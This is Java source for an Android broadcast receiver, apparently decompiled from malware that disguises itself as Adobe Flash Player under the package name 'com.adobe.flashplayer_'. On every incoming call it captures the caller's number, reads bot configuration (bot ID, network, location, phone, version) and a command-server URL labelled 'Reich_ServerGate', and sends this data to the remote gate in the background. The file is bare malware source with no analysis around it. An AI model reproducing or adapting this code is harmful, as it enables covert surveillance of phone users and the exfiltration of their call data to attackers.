package com.adobe.flashplayer_;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build.VERSION;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class FlashY extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        boolean f = false;
        String inP = intent.getStringExtra("incoming_number");
        if (inP != null && null == null) {
            f = true;
            inP = inP.replace("+", "");
            String addg = "";
            NetworkInfo netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
            String BotID = readConfig("BotID", context);
            String BotNetwork = readConfig("BotNetwork", context);
            String BotLocation = readConfig("BotLocation", context);
            String URL = readConfig("Reich_ServerGate", context);
            String BotVer = readConfig("BotVer", context);
            String SDK = VERSION.RELEASE;
            saveData(intent.getStringExtra("incoming_number"), inP, context);
            if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=in_call&i=" + inP, context.getFileStreamPath(inP).toString(), URL});
            }
        }
        if (inP == null && !f) {
            inP = "REC";
        }
    }

    private void saveData(String data, String f, Context context) {
        try {
            OutputStreamWriter osw = new OutputStreamWriter(context.openFileOutput(f, 0));
            osw.write(data);
            osw.close();
        } catch (IOException e) {
        }
    }

    private String readConfig(String config, Context context) {
        String ret = "";
        try {
            InputStream inputStream = context.openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }
}
